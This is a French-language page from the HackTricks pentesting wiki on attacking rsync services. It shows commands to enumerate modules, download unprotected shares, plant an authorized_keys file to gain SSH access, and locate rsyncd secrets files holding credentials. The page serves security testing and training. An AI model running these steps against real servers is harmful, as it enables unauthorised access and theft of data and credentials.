# 873 - Pentesting Rsync

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

> **rsync** est un utilitaire permettant de [transférer](https://en.wikipedia.org/wiki/File\_transfer) et de [synchroniser](https://en.wikipedia.org/wiki/File\_synchronization) efficacement des [fichiers](https://en.wikipedia.org/wiki/Computer\_file) entre un ordinateur et un disque dur externe et à travers des [ordinateurs en réseau](https://en.wikipedia.org/wiki/Computer\_network) en comparant les [heures de modification](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) et les tailles des fichiers.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Il est couramment trouvé sur les [systèmes d'exploitation de type Unix](https://en.wikipedia.org/wiki/Unix-like). L'algorithme rsync est un type de [codage delta](https://en.wikipedia.org/wiki/Delta\_encoding), et est utilisé pour minimiser l'utilisation du réseau. [Zlib](https://en.wikipedia.org/wiki/Zlib) peut être utilisé pour une [compression de données](https://en.wikipedia.org/wiki/Data\_compression) supplémentaire,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) et [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) ou [stunnel](https://en.wikipedia.org/wiki/Stunnel) peuvent être utilisés pour la sécurité.

D'après [wikipedia](https://en.wikipedia.org/wiki/Rsync).

**Port par défaut :** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Énumération

### Bannière & Communication manuelle
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Énumération des dossiers partagés**

**Un module rsync est essentiellement un partage de répertoire**. Ces modules **peuvent éventuellement être protégés par un mot de passe**. Cette option liste les modules disponibles et, éventuellement, détermine si le module nécessite un mot de passe pour l'accès :
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Notez qu'il pourrait être configuré un nom partagé pour ne pas être listé. Il pourrait donc y avoir quelque chose de **caché**.
Notez qu'il peut y avoir des **noms partagés** listés pour lesquels vous avez besoin de certains **identifiants** (différents) pour accéder. Ainsi, tous les noms listés ne seront pas toujours accessibles et vous le remarquerez si vous recevez un message _**"Accès refusé"**_ lors de la tentative d'accès à certains d'entre eux.

### [**Force brute**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Rsync manuel

Une fois que vous avez la **liste des modules**, vous avez plusieurs options différentes en fonction des actions que vous souhaitez entreprendre et si une authentification est requise ou non. **Si l'authentification n'est pas requise**, vous pouvez **lister** un dossier partagé :
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
Et **copiez** tous les **fichiers** sur votre machine locale via la commande suivante :
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ce **transfère récursivement tous les fichiers du répertoire** `<shared_name>` sur la machine `<IP>` dans le répertoire `./rsync_shared` sur la machine locale. Les fichiers sont transférés en mode "archive", ce qui garantit que les liens symboliques, les périphériques, les attributs, les permissions, les propriétés, etc. sont préservés lors du transfert.

Si vous **avez des identifiants**, vous pouvez **lister/télécharger** un **nom partagé** en utilisant (le mot de passe sera demandé) :
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Vous pourriez également **téléverser** du **contenu** en utilisant rsync (par exemple, dans ce cas, nous pouvons téléverser un fichier _**authorized\_keys**_ pour obtenir l'accès à la machine) :
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Trouvez le fichier de configuration rsyncd :
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dans le fichier de configuration, il est parfois possible de trouver le paramètre _secrets file = /chemin/vers/fichier_ et ce fichier peut contenir des noms d'utilisateur et des mots de passe autorisés à s'authentifier sur rsyncd.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
